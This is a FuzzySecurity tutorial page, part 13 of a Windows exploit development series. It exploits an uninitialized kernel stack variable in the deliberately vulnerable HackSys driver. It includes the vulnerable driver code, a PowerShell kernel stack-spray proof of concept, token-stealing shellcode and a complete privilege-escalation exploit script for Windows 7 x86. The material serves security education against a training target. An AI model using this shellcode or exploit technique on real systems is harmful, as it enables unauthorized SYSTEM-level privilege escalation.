@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Windows ExploitDev: Part 13</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPowerShell.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Kernel Exploitation: Uninitialized Stack Variable</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 13: Kernel Exploitation -> Uninitialized Stack Variable<span class="line"></span></h2>
+        <p>Hola, and welcome back to part 13 of the Windows exploit development tutorial series. Today we will be exploiting an uninitialized Kernel stack variable using <a href="https://twitter.com/HackSysTeam">@HackSysTeam's</a> extreme vulnerable driver. For more details on setting up the debugging environment see <a href="http://www.fuzzysecurity.com/tutorials/expDev/14.html">part 10</a>. I quickly want to give a shout-out to <a href="https://twitter.com/tiraniddo">@tiraniddo</a> for his ever professional n00b hotline, let's get to it!<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+      + NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques (<a href="https://twitter.com/j00ru">@j00ru</a>) - <a href="http://j00ru.vexillium.org/?p=769">here</a></p><br />
+	  
+<div class="fourteen columns bottom">
+<h2 class="title">Recon the challenge<span class="line"></span></h2>
+<p>We can have a brief look at the vulnerable function in question (<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/Source/UninitializedStackVariable.c">here</a>).</p><br />
+	  
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+NTSTATUS TriggerUninitializedStackVariable(IN PVOID UserBuffer) {
+    ULONG UserValue = 0;
+    ULONG MagicValue = 0xBAD0B0B0;
+    NTSTATUS Status = STATUS_SUCCESS;
+
+#ifdef SECURE
+    // Secure Note: This is secure because the developer is properly initializing
+    // UNINITIALIZED_STACK_VARIABLE to NULL and checks for NULL pointer before calling
+    // the callback
+    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable = {0};
+#else
+    // Vulnerability Note: This is a vanilla Uninitialized Stack Variable vulnerability
+    // because the developer is not initializing 'UNINITIALIZED_STACK_VARIABLE' structure
+    // before calling the callback when 'MagicValue' does not match 'UserValue'
+    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable;
+#endif
+
+    PAGED_CODE();
+
+    __try {
+        // Verify if the buffer resides in user mode
+        ProbeForRead(UserBuffer,
+                     sizeof(UNINITIALIZED_STACK_VARIABLE),
+                     (ULONG)__alignof(UNINITIALIZED_STACK_VARIABLE));
+
+        // Get the value from user mode
+        UserValue = *(PULONG)UserBuffer;
+
+        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
+        DbgPrint("[+] UninitializedStackVariable Address: 0x%p\n", &UninitializedStackVariable);
+
+        // Validate the magic value
+        if (UserValue == MagicValue) {
+            UninitializedStackVariable.Value = UserValue;
+            UninitializedStackVariable.Callback = &UninitializedStackVariableObjectCallback;
+        }
+
+        DbgPrint("[+] UninitializedStackVariable.Value: 0x%p\n", UninitializedStackVariable.Value);
+        DbgPrint("[+] UninitializedStackVariable.Callback: 0x%p\n", UninitializedStackVariable.Callback);
+
+#ifndef SECURE
+        DbgPrint("[+] Triggering Uninitialized Stack Variable Vulnerability\n");
+#endif
+
+        // Call the callback function
+        if (UninitializedStackVariable.Callback) {
+            UninitializedStackVariable.Callback();
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}</pre>
+</div>
+    
+<p>&nbsp;</p>
+<p>If we pass the driver function the correct magic value then it initializes the variable and callback parameters. If we pass an incorrect value then this does not happen. The problem here is that the variable is not set to a specific value when it is defined. As the variable resides on the stack it will contain whatever random junk is left behind by previous function calls. Notice that the code has a check (if UninitializedStackVariable.Callback...) which does nothing to protect it from a crash.<br /><br />
+
+The IOCTL for this function is 0x22202F. To see how the IOCTL can be identified, please check out <a href="http://www.fuzzysecurity.com/tutorials/expDev/14.html">part 10</a> and <a href="http://www.fuzzysecurity.com/tutorials/expDev/15.html">part 11</a> of this series. Let's jump into IDA and have a look at the function.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_UninitStack1.png">
+<p>&nbsp;</p>
+
+<p>Let's consider the 4 function blocks in the image above. If the comparison succeeds then we hit the green block where our variable gets set to proper values and then nothing bad happens in the red block where the callback function is called.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_UninitStack2.png">
+<p>&nbsp;</p>
+
+<p>Nice, however, if we fail the comparison then we skip the green block, further down we end up calling whatever junk happens to be on the kernel stack at the time!</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_UninitStack3.png">
+<p>&nbsp;</p>
+
+<p>This data is volatile, if you try to reproduce this, you are likely to see different values in WinDbg. Before we BSOD the box, let's quickly see how far this variable is from the start of our current stack.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_UninitStack4.png">
+<p>&nbsp;</p>
+
+<p>To get the distance to the faulty pointer, we do the following:</p>
+
+<p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>
+0x8a15ced0 - 0x8a15c9cc = 0x504 (1284 bytes)</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Let's do a sanity check BSOD by resuming execution flow.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_UninitStack5.png">
+<p>&nbsp;</p>
+
+<h2 class="title">Pwn all the things!<span class="line"></span></h2>
+<p><span style="color: #ffffff;"><strong>NtMapUserPhysicalPages</strong></span><br /><br />
+If we can overwrite that IntPtr on the kernel stack with a pointer to our shellcode then we win but how can we do that? Turns out Kernel stack spraying is a thing, I strongly recommend you to read <a href="http://j00ru.vexillium.org/?p=769">this</a> article by <a href="https://twitter.com/j00ru">@j00ru</a>. There is an undocumented function, NtMapUserPhysicalPages, we don't really care what it does but as part of it's functionality it copies input bytes into a local buffer on the kernel stack. The maximum size it can copy over is 1024 * IntPtr::Size (4 on 32-bit => 4096 bytes). That is perfect for our needs, the following POC can be used to illustrate this!</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("ntdll.dll")]
+    public static extern uint NtMapUserPhysicalPages(
+        IntPtr BaseAddress,
+        UInt32 NumberOfPages,
+        Byte[] PageFrameNumbers);
+}
+"@
+
+# $KernelStackSpray = 4*1024
+$KernelStackSpray = [System.BitConverter]::GetBytes(0xdeadb33f) * 1024
+
+# This call will fail with NTSTATUS = 0xC00000EF (STATUS_INVALID_PARAMETER_1),
+# however, by that time the buffer is already on the Kernel stack ;)
+[EVD]::NtMapUserPhysicalPages([IntPtr]::Zero, 1024, $KernelStackSpray) |Out-Null</pre>
+</div>
+    
+<p>Let's put a breakpoint on the return for NtMapUserPhysicalPages, run our POC and inspect the kernel stack.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_UninitStack6.png">
+<p>&nbsp;</p>
+
+<p>Perfect, after NtMapUserPhysicalPages returns, the stack should be set up so we can taint the uninitialized stack variable when we call the driver function. Notice that the spray is not contiguous, after looking around a bit I found that there are sizable chunks on the stack but they are split up by (I presume) stored values. Luckily though, the offset we need seems to be intact.<br /><br />
+
+One key point to keep in mind is that the stack is volatile, as such it is best to spray it right before triggering the bug and perform as few operations as possible in between to avoid the buffer getting clobbered!<br /><br />
+
+<span style="color: #ffffff;"><strong>Shellcode</strong></span><br /><br />
+Again, we are overwriting a function call here so we can reuse the token stealing shellcode from the previous part without making any modifications.</p><br />
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+$Shellcode = [Byte[]] @(
+	#---[Setup]
+	0x60,                               # pushad
+	0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
+	0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
+	0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
+	0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
+	#---[Copy System PID token]
+	0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
+	0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] &lt;-|
+	0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
+	0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
+	0x75, 0xED,                         # jnz                           ->|
+	0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
+	0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
+	#---[Recover]
+	0x61,                               # popad
+	0xC3                                # ret
+)</pre>
+</div>
+
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;"><strong>Setup</strong></span><br /><br />
+Our exploit work-flow will be as follows: (1) put our shellcode in memory somewhere, (2) spray the kernel stack with pointers to our shellcode and (3) trigger the uninitialized variable vulnerability.</p>
+
+<h2 class="title">Game Over<span class="line"></span></h2>
+<p>That should be the whole run-through, please refer to the full exploit below for more information.</p><br />
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+  
+public static class EVD
+{
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);  
+
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(
+    	IntPtr lpAddress,
+    	uint dwSize,
+    	UInt32 flAllocationType,
+    	UInt32 flProtect);  
+
+    [DllImport("ntdll.dll")]
+    public static extern uint NtMapUserPhysicalPages(
+        IntPtr BaseAddress,
+        UInt32 NumberOfPages,
+        Byte[] PageFrameNumbers);
+}
+"@
+
+# Compiled with Keystone-Engine
+# Hardcoded offsets for Win7 x86 SP1
+$Shellcode = [Byte[]] @(
+    #---[Setup]
+    0x60,                               # pushad
+    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
+    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
+    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
+    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
+    #---[Copy System PID token]
+    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
+    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] &lt;-|
+    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
+    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
+    0x75, 0xED,                         # jnz                           ->|
+    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
+    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
+    #---[Recover]
+    0x61,                               # popad
+    0xC3                                # ret
+)
+ 
+# Write shellcode to memory
+echo "`n[>] Allocating ring0 payload.."
+[IntPtr]$ShellcodePtr = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $ShellcodePtr, $Shellcode.Length)
+echo "[+] Payload size: $($Shellcode.Length)"
+echo "[+] Payload address: 0x$("{0:X8}" -f $ShellcodePtr.ToInt32())"
+
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+
+# j00ru -> nt!NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques
+# Shellocde IntPtr spray..
+$KernelStackSpray = [System.BitConverter]::GetBytes($ShellcodePtr.ToInt32()) * 1024
+echo "`n[>] Kernel stack spray.."
+echo "[+] Spray buffer: $(1024*[IntPtr]::Size)"
+echo "[+] Payload size: $([IntPtr]::Size)`n"
+
+echo "[>] Call NtMapUserPhysicalPages & trigger bug.."
+echo "[+] Radio silence..`n"
+[EVD]::NtMapUserPhysicalPages([IntPtr]::Zero, 1024, $KernelStackSpray) |Out-Null
+$Buffer = [System.BitConverter]::GetBytes(0xdeadb33f)
+[EVD]::DeviceIoControl($hDevice, 0x22202F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_UninitStack7.png">
+<p>&nbsp;</p>
+
+</div>
+    </div>
+</div>
+
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
